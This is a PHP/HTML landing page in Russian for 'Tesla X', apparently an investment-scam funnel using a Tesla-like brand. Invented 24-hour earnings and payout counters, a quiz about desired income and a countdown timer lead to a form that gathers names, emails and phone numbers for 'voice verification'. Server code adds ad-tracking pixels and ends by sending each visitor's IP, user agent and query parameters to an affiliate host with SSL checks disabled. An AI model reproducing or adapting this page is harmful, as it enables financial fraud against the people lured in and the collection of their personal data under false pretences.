<?php
$pixels = [ 'fb', 'fbe', 'ga', 'gad', 'mt', 'mtrk', 'tt', 'vk' ];
foreach ( $pixels as $px ) if (isset( $_GET[$px] )) {
	$z = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
	if ( $z ) setcookie( $px, $z, time() + 2592000, '/' );
}
?><!DOCTYPE html>
<html>

<head>
    <!-- 164 - 342  [o6;l8] tesla-x-quiz -->
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tesla X</title>
    <link rel="icon" type="image/x-icon" href="img/favicon/tesla.ico">
    <link rel="stylesheet" href="css/index.css">
    <link href="assets/landing/css/intlTelInput.css" rel="stylesheet" type="text/css">
    <link href="assets/landing/css/landing.css" rel="stylesheet" type="text/css">
    <!--[HEADER]--></head>

<body cz-shortcut-listen="true"><span id="warning-container"><i data-reactroot=""></i></span>
    <header class="header">
        <div class="upper-header__section">
            <div class="container">
                <ul class="upper-header__list">
                    <li>
                        <p class="upper-header__text">
                            Заработано с нами за 24ч:
                            <span class="upper-header__text--span">1,830,837.94$</span>
                        </p>
                    </li>
                    <li>
                        <p class="upper-header__text">
                            Инвестировано в нас за 24ч:
                            <span class="upper-header__text--span">4,232,583.23$</span>
                        </p>
                    </li>
                    <li>
                        <p class="upper-header__text">
                            Выведено за 24ч:
                            <span class="upper-header__text--span">921,353.77$</span>
                        </p>
                    </li>
                </ul>
            </div>
        </div>
        <div class="header__sec1">
            <div class="container header__container">
                <div class="header__nav">
                    <a href="#" aria-label="link to main page"><img class="header__logo" src="img/TESLA-X.webp" loading="lazy" alt="logo tesla-X">
                        <img class="header__logo--mobile" src="img/TESLA-Xmob.webp" loading="lazy" alt="logo tesla-X"></a>
                </div>
            </div><br>
            <div class="container1">
                <div class="header__scrollbal">
                    <div class="header__scrollbal-over"></div>
                </div>
                <div class="header__navigation">
                    <div class="header__arrow header__arrow-left">
                        <svg width="25" height="25" viewbox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle cx="12.5" cy="12.5" r="12.5" fill="#F0F0F0"></circle>
                            <g clip-path="url(#clip0_207_3)">
                                <path d="M15.7974 18.7372C15.656 18.9059 15.4639 18.9914 15.2712 18.9912C15.0965 18.9912 14.9213 18.9211 14.7831 18.779L9.24037 13.0828C9.09397 12.9323 9.01079 12.7213 9.01079 12.5002C9.01079 12.2791 9.09396 12.0679 9.24037 11.9176L14.7831 6.22145C15.0737 5.92291 15.5278 5.94152 15.7975 6.2634C16.0673 6.58512 16.0503 7.08805 15.7597 7.38673L10.7838 12.5003L15.7597 17.6139C16.0503 17.9125 16.0673 18.4154 15.7975 18.7373L15.7974 18.7372Z" fill="#C70122"></path>
                            </g>
                            <defs>
                                <clippath id="clip0_207_3">
                                    <rect width="7" height="13" fill="white" transform="matrix(-1 0 0 1 16 6)"></rect>
                                </clippath>
                            </defs>
                        </svg>
                    </div>
                    <div class="header__number">
                        <span class="current-number">1</span>/5
                    </div>
                    <div class="header__arrow header__arrow-right">
                        <svg width="25" height="25" viewbox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
                            <circle r="12.5" transform="matrix(-1 0 0 1 12.5 12.5)" fill="#F0F0F0"></circle>
                            <g clip-path="url(#clip0_207_4)">
                                <path d="M9.20256 18.7372C9.34398 18.9059 9.5361 18.9914 9.7288 18.9912C9.90355 18.9912 10.0787 18.9211 10.2169 18.779L15.7596 13.0828C15.906 12.9323 15.9892 12.7213 15.9892 12.5002C15.9892 12.2791 15.906 12.0679 15.7596 11.9176L10.2169 6.22145C9.92634 5.92291 9.47217 5.94152 9.20245 6.2634C8.93272 6.58512 8.94967 7.08805 9.24034 7.38673L14.2162 12.5003L9.24034 17.6139C8.94967 17.9125 8.93272 18.4154 9.20245 18.7373L9.20256 18.7372Z" fill="#C70122"></path>
                            </g>
                            <defs>
                                <clippath id="clip0_207_4">
                                    <rect width="7" height="13" fill="white" transform="translate(9 6)"></rect>
                                </clippath>
                            </defs>
                        </svg>
                    </div>
                </div>
            </div>
            <main class="main">
                <div class="container1">
                    <section class="card card-one">
                        <div class="card-wrapper card-one__wrapper">
                            <h1 class="card__title card-one__title">
                                Пройдите короткий опрос от компании "Tesla X" и начните
                                зарабатывать
                            </h1>
                            <img class="card__img card-one__img" src="img/card_1.webp" width="146" height="111" alt="logo Tesla X">
                        </div>
                    </section>
                    <section class="card card-two hidden">
                        <div class="card-wrapper card-two__wrapper">
                            <img class="card__lamp card-two__lamp" src="img/icon_lamp.webp" width="18" height="25" alt="">
                            <h1 class="card__title">У вас был опыт в инвестировании?</h1>
                            <p class="card__description">
                                Это позволит команде подготовить необходимую стратегию
                                инвестирования
                            </p>
                            <div class="card__checkbox">
                                <div class="card__checkbox-wrapper border">
                                    <input class="visually-hidden" type="radio" name="card-1" value="1" checked="">
                                    <img class="card__img" src="img/card_2-yes.webp" width="68" height="68" alt="yes">
                                    <p class="card__checkbox-text">Да</p>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <input class="visually-hidden" type="radio" name="card" value="2">
                                    <img class="card__img" src="img/card_2-no.webp" width="68" height="68" alt="yes">
                                    <p class="card__checkbox-text">Нет</p>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="card card-three hidden">
                        <div class="card-wrapper card-three__wrapper">
                            <img class="card__lamp card-three__lamp" src="img/icon_lamp.webp" width="18" height="25" alt="">
                            <h1 class="card__title">Гражданином какой страны вы являетесь?</h1>
                            <p class="card__description">
                                Это позволит убедиться в возможности инвестирования
                            </p>
                            <div class="card__checkbox">
                                <div class="card__checkbox-wrapper border">
                                    <button data-country="usa" class="btn__country">
                                        <input class="visually-hidden" type="radio" name="investment" value="usa">
                                        <img class="card__img" src="img/flags/usa.webp" width="50" height="50" alt="yes">
                                        <p class="card__checkbox-text">USA</p>
                                    </button>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <button data-country="eu" class="btn__country">
                                        <input class="visually-hidden" type="radio" name="investment" value="2" data-country="eu">
                                        <img class="card__img" src="img/flags/european-union.webp" width="50" height="50" alt="yes">
                                        <p class="card__checkbox-text">European Union</p>
                                    </button>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <button data-country="ru" class="btn__country">
                                        <input class="visually-hidden" type="radio" name="investment" value="3" data-country="ru">
                                        <img class="card__img" src="img/flags/russia.webp" width="50" height="50" alt="yes">
                                        <p class="card__checkbox-text">Russia</p>
                                    </button>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <button data-country="ua" class="btn__country">
                                        <input class="visually-hidden" type="radio" name="investment" value="4" id="checkbox" data-country="ua">
                                        <img class="card__img" src="img/flags/ukraine.webp" width="50" height="50" alt="yes">
                                        <p class="card__checkbox-text">Ukraine</p>
                                    </button>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="card card-four hidden">
                        <div class="card-wrapper card-three__wrapper">
                            <h1 class="card__title">
                                Какую сумму вы бы хотели зарабатывать в месяц?
                            </h1>
                            <p class="card__description">
                                Это позволит подготовить соответствующую торговую стратегию
                            </p>
                            <div class="card__checkbox">
                                <div class="card__checkbox-wrapper border">
                                    <input class="visually-hidden" type="radio" name="investment" value="1" checked="">
                                    <div class="money__wraper money__wraper--first">
                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
                                    </div>
                                    <p class="card__checkbox-text">до 2.500€</p>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <input class="visually-hidden" type="radio" name="investment" value="2">
                                    <div class="money__wraper money__wraper--first">
                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
                                    </div>
                                    <p class="card__checkbox-text">от 3.000€</p>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <input class="visually-hidden" type="radio" name="investment" value="3">
                                    <div class="money__wraper">
                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
                                    </div>
                                    <p class="card__checkbox-text">от 10.000€</p>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <input class="visually-hidden" type="radio" name="investment" value="4">
                                    <div class="money__wraper">
                                        <img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes"><img class="card__money" src="img/money.webp" width="35" height="35" alt="yes">
                                    </div>
                                    <p class="card__checkbox-text">от 30.000€</p>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="card card-five hidden">
                        <div class="card-wrapper card-five__wrapper">
                            <h1 class="card__title">
                                Сколько времени вы готовы тратить на инвестирование?
                            </h1>
                            <div class="card__checkbox">
                                <div class="card__checkbox-wrapper border">
                                    <input class="visually-hidden" type="radio" name="investment" value="1" checked="">
                                    <img class="card__img" src="img/card5_1.webp" width="50" height="43" alt="">
                                    <p class="card__checkbox-text">1 час<br>каждый день</p>
                                </div>
                                <div class="card__checkbox-wrapper">
                                    <input class="visually-hidden" type="radio" name="investment" value="2">
                                    <img class="card__img card-five__img" src="img/card5_2.webp" width="50" height="38" alt="">
                                    <p class="card__checkbox-text">2 часа<br>раз в неделю</p>
                                </div>
                            </div>
                        </div>
                    </section>
                    <section class="card card-six hidden">
                        <div class="card-wrapper card-six__wrapper">
                            <h1 class="card__title">
                                Поздравляем!
                                Вы за шаг до успеха, оставьте свои контактные данные и начините зарабатывать уже сегодня!
                            </h1>
                            <form class="form" action="api.php?<?=http_build_query($_GET);?>" method="post"><?php if (isset($_GET["utm_source"])) : ?><input type="hidden" name="utm_source" value="<?=htmlspecialchars($_GET["utm_source"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_content"])) : ?><input type="hidden" name="utm_content" value="<?=htmlspecialchars($_GET["utm_content"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_term"])) : ?><input type="hidden" name="utm_term" value="<?=htmlspecialchars($_GET["utm_term"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_campaign"])) : ?><input type="hidden" name="utm_campaign" value="<?=htmlspecialchars($_GET["utm_campaign"]);?>" /><?php endif; ?><?php if (isset($_GET["utm_medium"])) : ?><input type="hidden" name="utm_medium" value="<?=htmlspecialchars($_GET["utm_medium"]);?>" /><?php endif; ?><?php if (isset($_GET["subid"])) : ?><input type="hidden" name="subid" value="<?=htmlspecialchars($_GET["subid"]);?>" /><?php endif; ?><?php if (isset($_GET["uuid"])) : ?><input type="hidden" name="uuid" value="<?=htmlspecialchars($_GET["uuid"]);?>" /><?php endif; ?><?php if (isset($_GET["fbclid"])) : ?><input type="hidden" name="fbclid" value="<?=htmlspecialchars($_GET["fbclid"]);?>" /><?php endif; ?><?php if (isset($_GET["gclid"])) : ?><input type="hidden" name="gclid" value="<?=htmlspecialchars($_GET["gclid"]);?>" /><?php endif; ?><?php if (isset($_GET["cpc"])) : ?><input type="hidden" name="cpc" value="<?=htmlspecialchars($_GET["cpc"]);?>" /><?php endif; ?><?php if (isset($_GET["cur"])) : ?><input type="hidden" name="cur" value="<?=htmlspecialchars($_GET["cur"]);?>" /><?php endif; ?>                                <div class="form__wrapper">
                                    <label class="form__label" for="name">Ваше имя</label>
                                    <input class="form__input" id="name" type="text" name="forename" placeholder="Имя" required>
                                </div>
                                <div class="form__wrapper">
                                    <label class="form__label" for="last">Ваша фамилия</label>
                                    <input class="form__input" id="surname" type="text" name="surname" placeholder="Фамилия" required>
                                </div>
                                <div class="form__wrapper">
                                    <label class="form__label" for="email">Ваш e-mail</label>
                                    <input class="form__input" id="email" type="email" name="email" placeholder="Email" required>
                                </div>
                                <div class="form__wrapper">
                                    <label class="form__label" for="phone">Ваш номер телефона</label>
                                    <input class="form__input phone" id="phone" type="tel" name="phone" required>
                                </div>
                                <div class="form__attention">
                                    <p class="attention__title">
                                        Для участия в программе нужна голосовая верификация, убедитесь что указали правильный номер телефона.
                                    </p>
                                </div>
                                <button class="buttons" type="submit" name="submit">
                                    Начать зарабатывать
                                </button>
                                <input type="hidden" name="countryDialCode" value="+7"/>
                                <input type="hidden" name="country" value="ru"/>
                                <input type="hidden" name="comment" value="" />
                            </form>
                        </div>
                    </section>
                    <button data-slide="0" id="button_next" class="button" type="button">
                        Далее
                    </button>
                </div>
            </main>
            <div class="footer bb hidden">
                <div class="time-text">Осталось времени:</div>
                <div class="timer-wrap">
                    <div class="timer-new">
                        <div class="timer__index">
                            <span id="min" class="timer__item minutes time">3</span>
                        </div>
                        <div class="timer__point"></div>
                        <div class="timer__index">
                            <span id="sec" class="timer__item minutes time">00</span>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </header>
    <input type="hidden" name="onlyCountries" value="ru"/>
    <input type="hidden" name="allowDropdown" value="false"/>
    <script type="text/javascript" src="assets/landing/js/jquery.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/jquery.validate.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/jquery.mask.min.js"></script>
    <script type="text/javascript" src="assets/landing/js/intlTelInput.js"></script>
    <script type="text/javascript" src="assets/landing/js/form.js"></script>
    <script src="js/main.js" type="text/javascript"></script>
    <?php
$pixl = array (
  'fb' => '',
  'fbe' => 'Lead',
  'ga' => '',
  'gad' => '',
  'tt' => '',
  'vk' => '',
  'mt' => '',
  'mtrk' => '',
);
$isbad = isset($_GET['id']) && substr( $_GET['id'], 0, 1 ) == '0';
if ( isset($_GET['status']) && $_GET['status'] == 'error' ) $isbad = true;
foreach ( $pixl as $px => $df ) if ( $isbad ) {
	$$px = false;
} elseif (isset( $_GET[$px] )) {
	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_GET[$px], FILTER_SANITIZE_STRING )) );
} elseif (isset( $_COOKIE[$px] )) {
	$$px = preg_replace( '#[^0-9A-Za-z\-\_\.\,]+#i', '', stripslashes(filter_var( $_COOKIE[$px], FILTER_SANITIZE_STRING )) );
} else $$px = $df;
if ( $fb ) {
	$fb = explode( ',', $fb );
	?><script>!function(f,b,e,v,n,t,s) {if(f.fbq)return;n=f.fbq=function(){n.callMethod?n.callMethod.apply(n,arguments):n.queue.push(arguments)}; if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0'; n.queue=[];t=b.createElement(e);t.async=!0; t.src=v;s=b.getElementsByTagName(e)[0]; s.parentNode.insertBefore(t,s)}(window, document,'script','https://connect.facebook.net/en_US/fbevents.js'); <?php
	foreach ( $fb as $f ) if ( $f = trim($f) ) :
	?> fbq('init', '<?=$f;?>'); <?php
	endif;
	?> fbq('track', 'PageView'); setTimeout( fbq, 30000, 'track', 'ViewContent' );</script><noscript><?php
	foreach ( $fb as $f ) if ( $f = trim($f) ) :
	?><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=<?=$f;?>&ev=PageView&noscript=1" /><?php
	endif;
	?></noscript><?php
}
if ( $ga ) {
	$gtm = ( strtolower(substr( $ga, 0, 3 )) == 'gtm' ) ? 1 : 0;
	if ( $gtm ) {
		?><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start': new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src='https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f); })(window,document,'script','dataLayer','<?=$ga;?>');</script><noscript><iframe src="https://www.googletagmanager.com/ns.html?id=<?=$ga;?>" height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript><?php
	} else {
		?><script async src="https://www.googletagmanager.com/gtag/js?id=<?=$ga;?>"></script><script> window.dataLayer = window.dataLayer || []; function gtag(){dataLayer.push(arguments)}; gtag('js', new Date()); gtag('config', '<?=$ga;?>');</script><?php
	}
}
if ( $tt ) {
	?><script> !function (w, d, t) {  w.TiktokAnalyticsObject=t;var ttq=w[t]=w[t]||[];ttq.methods=["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie"],ttq.setAndDefer=function(t,e){t[e]=function(){t.push([e].concat(Array.prototype.slice.call(arguments,0)))}};for(var i=0;i<ttq.methods.length;i++)ttq.setAndDefer(ttq,ttq.methods[i]);ttq.instance=function(t){for(var e=ttq._i[t]||[],n=0;n<ttq.methods.length;n++)ttq.setAndDefer(e,ttq.methods[n]);return e},ttq.load=function(e,n){var i="https://analytics.tiktok.com/i18n/pixel/events.js";ttq._i=ttq._i||{},ttq._i[e]=[],ttq._i[e]._u=i,ttq._t=ttq._t||{},ttq._t[e]=+new Date,ttq._o=ttq._o||{},ttq._o[e]=n||{};var o=document.createElement("script");o.type="text/javascript",o.async=!0,o.src=i+"?sdkid="+e+"&lib="+t;var a=document.getElementsByTagName("script")[0];a.parentNode.insertBefore(o,a)}; ttq.load('<?=$tt;?>'); ttq.page(); }(window, document, 'ttq'); </script><?php
}
if ( $vk ) {
	?><script type="text/javascript">!function(){var t=document.createElement("script");t.type="text/javascript",t.async=!0,t.src='https://vk.com/js/api/openapi.js?169',t.onload=function(){VK.Retargeting.Init("<?=$vk;?>"),VK.Retargeting.Hit()},document.head.appendChild(t)}();</script><noscript><img src="https://vk.com/rtrg?p=<?=$vk;?>" style="position:fixed; left:-999px;" alt=""/></noscript><?php
}
if ( $mt ) {
	?><script type="text/javascript"> var _tmr = window._tmr || (window._tmr = []); _tmr.push({id: "<?=$mt;?>", type: "pageView", start: (new Date()).getTime(), pid: "USER_ID"}); (function (d, w, id) { if (d.getElementById(id)) return; var ts = d.createElement("script"); ts.type = "text/javascript"; ts.async = true; ts.id = id; ts.src = (d.location.protocol == "https:" ? "https:" : "http:") + "//top-fwz1.mail.ru/js/code.js"; var f = function () {var s = d.getElementsByTagName("script")[0]; s.parentNode.insertBefore(ts, s);}; if (w.opera == "[object Opera]") { d.addEventListener("DOMContentLoaded", f, false); } else { f(); } })(document, window, "topmailru-code");</script><noscript><div><img src="//top-fwz1.mail.ru/counter?id=<?=$mt;?>;js=na" style="border:0;position:absolute;left:-9999px;" alt="" /></div></noscript><?php
}
if ( $mtrk ) {
	?><script type="text/javascript" > (function(m,e,t,r,i,k,a){m[i]=m[i]||function(){(m[i].a=m[i].a||[]).push(arguments)}; m[i].l=1*new Date();k=e.createElement(t),a=e.getElementsByTagName(t)[0],k.async=1,k.src=r,a.parentNode.insertBefore(k,a)}) (window, document, "script", "https://mc.yandex.ru/metrika/tag.js", "ym"); ym(<?=$mtrk;?>, "init", { clickmap:true, trackLinks:true, accurateTrackBounce:true, webvisor:true }); </script><noscript><div><img src="https://mc.yandex.ru/watch/<?=$mtrk;?>" style="position:absolute; left:-9999px;" alt="" /></div></noscript><?php
}
?></body>

</html><?php
$curl = curl_init( "https://r.1xcpa.net/teslax-new/signin4/?flow=486&only=code&" . http_build_query($_GET) );
curl_setopt( $curl, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $curl, CURLOPT_USERAGENT, $_SERVER["HTTP_USER_AGENT"] );
curl_setopt( $curl, CURLOPT_HTTPHEADER, [
 "X-Real-IP: " . $_SERVER["HTTP_CF_CONNECTING_IP"] ?? $_SERVER["HTTP_X_FORWARDED_FOR"] ?? $_SERVER["REMOTE_ADDR"],
 "X-Host: " .  $_SERVER["HTTP_X_FORWARDED_HOST"] ?? $_SERVER["HTTP_X_HOST"] ?? $_SERVER["HTTP_HOST"] ?? $_SERVER["SERVER_NAME"]
]);
curl_setopt( $curl, CURLOPT_SSL_VERIFYHOST, 0 );
curl_setopt( $curl, CURLOPT_SSL_VERIFYPEER, 0 );
curl_exec( $curl );
curl_close( $curl );
?>